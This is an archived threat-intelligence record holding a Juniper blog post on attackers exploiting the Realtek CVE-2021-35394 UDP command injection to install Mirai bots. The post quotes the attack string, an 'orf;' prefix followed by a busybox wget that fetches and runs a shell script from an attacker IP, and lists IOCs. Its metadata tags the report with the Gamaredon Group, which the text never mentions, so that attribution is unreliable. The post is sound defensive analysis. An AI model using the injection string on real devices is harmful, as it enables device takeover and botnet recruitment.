{
    "id": "0ec40ccf-ab21-4ebc-9451-6a604cf719ae",
    "created_at": "2023-01-12T15:08:46.792917Z",
    "updated_at": "2025-03-27T02:05:49.24389Z",
    "deleted_at": null,
    "sha1_hash": "aca1744bde1d40556e1ff9e8234b080e3a000a2f",
    "title": "2021-08-27 - RealTek CVE-2021-35394 Exploited in the Wild",
    "authors": "",
    "file_creation_date": "2022-05-28T05:08:25Z",
    "file_modification_date": "2022-05-28T05:08:25Z",
    "file_size": 583597,
    "plain_text": "# RealTek CVE-2021-35394 Exploited in the Wild\n\n**[blogs.juniper.net/en-us/threat-research/realtek-cve-2021-35394-exploited-in-the-wild](https://blogs.juniper.net/en-us/threat-research/realtek-cve-2021-35394-exploited-in-the-wild)**\n\nBy August 27, 2021\n\nJuniper Threat Labs has detected that the threat actors that we recently observed exploiting\n[CVE-2021-20090 are now actively exploiting CVE-2021-35394, a vulnerability disclosed last](https://nvd.nist.gov/vuln/detail/CVE-2021-35394)\nweek by IoT Inspector Research Lab. This attack targets the Realtek RTL8xxx SoC chipsets\nthat are used in many embedded devices, particularly wireless routers. At the time of this\nwriting, all of the download servers used in this campaign are online and the attacks are\nongoing.\n\n## The Attack\n\nOne of the Realtek vulnerabilities disclosed last week concerns a UDP server running on\nport 9034. In 2015, Peter Adkins found that certain D-Link routers were running a UDP\nserver that allowed remote execution of arbitrary commands. This vulnerability was\nostensibly patched, but IoT Inspector Research Lab found that the fix was simply to verify\nthat all command strings had the prefix “orf”. This mitigation is easily circumvented by\nprepending “orf;” to any injected command string:\n```\norf;malicious_command\n\n```\n\n-----\n\nExploits require only a single UDP packet from the attacker. Each observed variant of this\nattack follows the same steps. First, the attackers use the open UDP server to inject a shell\ncommand:\n\nFigure 1. UDP Packet sent by attacker\nThe injected command, seen in the data field above, is:\n```\norf;cd /tmp||cd /var&&busybox wget hxxp://45[.]61.188.184/f.sh -O b.sh&&sh b.sh;#\n\n```\nThe invalid “orf” command is ignored and a shell script is downloaded, renamed and\nexecuted. The following is an example of these shell scripts:\n\nFigure 2. One of the shell scripts used in the command injection\nThis script attempts to download and run binary executables on the compromised host.\nTargeted architectures include:\n\n\n-----\n\nARM (v5 and v7)\nMIPS (both big- and little-endian)\nSuperH\n\nThe downloaded executables are variants of Mirai and turn the target computer into a\nremotely controllable bot in the threat actors’ botnet.\n\nWe have observed an overlap between the IP addresses in this campaign and those in the\n[campaign described in a recent Juniper Threat Labs blog post. However, unlike the previous](https://blogs.juniper.net/en-us/security/freshly-disclosed-vulnerability-cve-2021-20090-exploited-in-the-wild)\nattacks over HTTP, the connectionless nature of UDP allows the threat actors to launch more\nattacks with fewer resources.\n\n## Other Vulnerabilities\n\n[This discovery follows SAM Seamless Network’s blog post last week on these threat actors](https://securingsam.com/realtek-vulnerabilities-weaponized/)\nexploiting another Realtek vulnerability disclosed by IoT Inspector Research Lab. As many\nRealtek RTL8xxx-based devices remain unpatched, we expect to see continuing attacks as\nmore of these vulnerabilities are weaponized.\n\n## Detection\n\nThis attack is detected on Juniper SRX devices as APP:MISC:REALTEK-JUNGLE-SDK-CI.\nThe malicious files and servers used in this attack are blocked by the Juniper Advanced\nThreat Protection products.\n\nFigure 3. Detection by Juniper ATP Cloud\n\n## IOCs\n\n\n-----\n\n```\nFiles:\ndaef5417dd163c2d2600382a484b36f594378d909ce54e5348b0c7dd1326c57d r\n1ce6590f632d1b37c77feefe60ef632c315357ddde632c0a0aab78c69616a5b4 f.sh\n0018e361be72a44b7b38bbecfede8d571418e56d4d62a8e186991bef322a0c16 b.arm5\n171961046ee6d18424cf466ad7e01096aecf48ed602d8725e6563ad8c61f1115 b.arm7\n924b6aec8aa5935e27673ee96d43dd0d1b60f044383b558e3f66cd4331f17ef4 b.mips\n98fc6b2cbd04362dc10a5445c00c23c2a2cb39d24d91beab3c200f87bfd889ab b.mpsl\n9bdb7d4778261bb34df931b41d32ee9188d0c7a7e10d4d68d56f6faebd047fe4 b.sh4\n555ae4193c53af15bdcd82d534ed5f13fcc96c16c59b9e8072b5b122c6df8d4a fbot.mips\n2bfca0726b9109ab675e6bdbe0fb81e80fbf7ee6af2f129672569e5476e57b47 fbot.mpsl\nAttackers:\n45[.]137.23.190\n185[.]222.59.5\n103[.]145.13.80\n103[.]145.13.25\nDownload servers:\n45[.]61.188.184\n37[.]0.11.132\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-08-27 - RealTek CVE-2021-35394 Exploited in the Wild.pdf"
    ],
    "report_names": [
        "2021-08-27 - RealTek CVE-2021-35394 Exploited in the Wild.pdf"
    ],
    "threat_actors": [
        {
            "id": "81bd7107-6b2d-45c9-9eea-1843d4b9b308",
            "created_at": "2022-10-25T15:50:23.320841Z",
            "updated_at": "2025-03-27T02:00:55.441723Z",
            "deleted_at": null,
            "main_name": "Gamaredon Group",
            "aliases": [
                "Gamaredon Group",
                "IRON TILDEN",
                "Primitive Bear",
                "ACTINIUM",
                "Armageddon",
                "Shuckworm",
                "DEV-0157",
                "Aqua Blizzard"
            ],
            "source_name": "MITRE:Gamaredon Group",
            "tools": [
                "QuietSieve",
                "Pteranodon",
                "PowerPunch"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d5156b55-5d7d-4fb2-836f-861d2e868147",
            "created_at": "2023-01-06T13:46:38.557326Z",
            "updated_at": "2025-03-27T02:00:02.861124Z",
            "deleted_at": null,
            "main_name": "Gamaredon Group",
            "aliases": [
                "Aqua Blizzard",
                "Actinium",
                "DEV-0157",
                "Blue Otso",
                "G0047",
                "PRIMITIVE BEAR",
                "Shuckworm",
                "Trident Ursa",
                "UAC-0010",
                "Winterflounder",
                "ACTINIUM",
                "BlueAlpha",
                "IRON TILDEN"
            ],
            "source_name": "MISPGALAXY:Gamaredon Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "61940e18-8f90-4ecc-bc06-416c54bc60f9",
            "created_at": "2022-10-25T16:07:23.659529Z",
            "updated_at": "2025-03-27T02:02:09.912404Z",
            "deleted_at": null,
            "main_name": "Gamaredon Group",
            "aliases": [
                "Actinium",
                "Aqua Blizzard",
                "Armageddon",
                "Blue Otso",
                "BlueAlpha",
                "Callisto",
                "DEV-0157",
                "Iron Tilden",
                "Operation STEADY#URSA",
                "Primitive Bear",
                "SectorC08",
                "Shuckworm",
                "Trident Ursa",
                "UAC-0010",
                "Winterflounder"
            ],
            "source_name": "ETDA:Gamaredon Group",
            "tools": [
                "Aversome infector",
                "BoneSpy",
                "DessertDown",
                "DilongTrash",
                "DinoTrain",
                "EvilGnome",
                "FRAUDROP",
                "Gamaredon",
                "GammaDrop",
                "GammaLoad",
                "GammaSteel",
                "Gussdoor",
                "ObfuBerry",
                "ObfuMerry",
                "PlainGnome",
                "PowerPunch",
                "Pteranodon",
                "Pterodo",
                "QuietSieve",
                "Remote Manipulator System",
                "Resetter",
                "RuRAT",
                "SUBTLE-PAWS",
                "UltraVNC"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536126,
    "ts_updated_at": 1743041149,
    "ts_creation_date": 1653714505,
    "ts_modification_date": 1653714505,
    "files": {
        "pdf": "https://archive.orkl.eu/aca1744bde1d40556e1ff9e8234b080e3a000a2f.pdf",
        "text": "https://archive.orkl.eu/aca1744bde1d40556e1ff9e8234b080e3a000a2f.txt",
        "img": "https://archive.orkl.eu/aca1744bde1d40556e1ff9e8234b080e3a000a2f.jpg"
    }
}